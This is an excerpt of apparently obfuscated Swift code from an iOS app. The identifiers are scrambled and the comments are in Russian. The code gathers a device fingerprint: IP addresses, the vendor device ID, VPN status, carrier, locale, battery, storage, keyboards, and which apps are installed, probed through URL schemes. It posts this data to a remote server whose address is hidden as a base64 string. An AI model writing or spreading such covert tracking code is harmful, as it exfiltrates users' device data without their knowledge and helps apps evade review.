...
enum PostEndpoint: SecondEndpoint {
    
    case NwroEjzDSh(myData: YLdeLronRu, isCaptured: Bool, isCast: Bool)
    ...
    var mainURL: String {
        ...
        default:
            return rnWZyjoOVX("aHR0cHM6Ly9mYWZ1dGVjYXMuc3BhY2UvYXBwL3BlYWtrMXNvbHU=")
        }
    }
    ...
    var body: [String: Any] {
        ...
        case .NwroEjzDSh(let myData, let isCaptured, let cast):
...
class EooiIDiPbc {
    ...
    func request<T: Codable>(endpoint: SecondEndpoint, completion: @escaping (Result< T, Error>) -> Void) {

        guard let url = URL(string: rnWZyjoOVX(endpoint.mainURL)) else { return }
...
protocol RepositoryProtocolSecond {
    func NwroEjzDSh(isCaptured: Bool, isCast: Bool, mydata: YLdeLronRu, completion: @escaping (Result< Int, Error>) -> Void)
}

class GQTqzTiWUy: RepositoryProtocolSecond {

    private let networkEngine: EooiIDiPbc

    init(networkEngine: EooiIDiPbc = EooiIDiPbc()) {
        self.networkEngine = networkEngine
    }
    
    func NwroEjzDSh(isCaptured: Bool, isCast: Bool, mydata: YLdeLronRu, completion: @escaping (Result< Int, Error>) -> Void) {
        networkEngine.request(endpoint: PostEndpoint.NwroEjzDSh(myData: mydata, isCaptured: isCaptured, isCast: isCast), completion: completion)
    }
}
...
struct zJZMudBOpj {
    ...
    static func FOpkPvYpCc() -> YLdeLronRu {
        
        //получить адрес вайфая
        let wifiAdress = gQlxOpnOuL(for: .wifi)
        let cellularAdress = gQlxOpnOuL(for: .cellular)
        ...
        //получить уникальный номер девайса
        let uniqNumber = UIDevice.current.identifierForVendor?.uuidString ?? "cant get"
        ...
        //Device language:
        let locale = Locale.preferredLanguages[0].prefix(2)
        ...
        let totalSpaceInBytes = iwgorhDlGA.fJrKhLsfys(for: .systemSize) ?? 0
        let totalSpaceInGB = iwgorhDlGA.KTJpCoCwiQ(totalSpaceInBytes) ?? "can't get"
        
        let freeSpaceInBytes = iwgorhDlGA.fJrKhLsfys(for: .systemFreeSize) ?? 0
        let freeSpaceInGB = iwgorhDlGA.KTJpCoCwiQ(freeSpaceInBytes) ?? "can't get"
        
        var isApps: [String: String] {
            ...
            var appInstallStatus: [String: String] = [:]

            for (appName, appScheme) in appSchemes {
                
                if let url = URL(string: appScheme) {
                    
                    if UIApplication.shared.canOpenURL(url) {
                        
                        appInstallStatus[appName] = "Yes"
                        
                    } else {
                        
                        appInstallStatus[appName] = "No"
                    }
                }
            }
        ...
        let batteryLevel = (Double(String(format: "%.2f", UIDevice.current.batteryLevel)) ?? 0) * 100.0
        ...
        var isFullChrg: Bool {
            ...
            return batteryLevel == 100 ? true : false
        }
        
        let myData = YLdeLronRu(isVpn: isConnectedToVpn, deviceName: nameDevice, deviceModel: deviceType.rawValue, uniqueNumber: uniqNumber, wifiAddress: [wifiAdress, cellularAdress], simCarrier: arrayOfCarrier, iosVersion: systemVersion, deviceLang: locale, timeZone: localTimeZoneAbbreviation, isCharging: isCharging, capacity: memory + ", " + freeSpaceInGB + ", " + totalSpaceInGB, apps: isApps, chargePercent: batteryLevel, keyboards: availableLanguages, region: "\(regionCode ?? "nil")", isMetric: isMetric, isFullChrg: isFullChrg)
        
        return myData
    }
    
    static  func gQlxOpnOuL(for network: Network) -> String? {
        var address: String?
...
struct YLdeLronRu {
    ...
    let simCarrier: [String?]
    let iosVersion: String
    let deviceLang: Substring
    let timeZone: String
    let isCharging: Bool
    let capacity: String
...
struct iwgorhDlGA {
    ...
    static func fJrKhLsfys(for key: FileAttributeKey) -> Int64? {
    ...
    static func KTJpCoCwiQ(_ bytes: Int64, to units: ByteCountFormatter.Units = .useGB) -> String? {
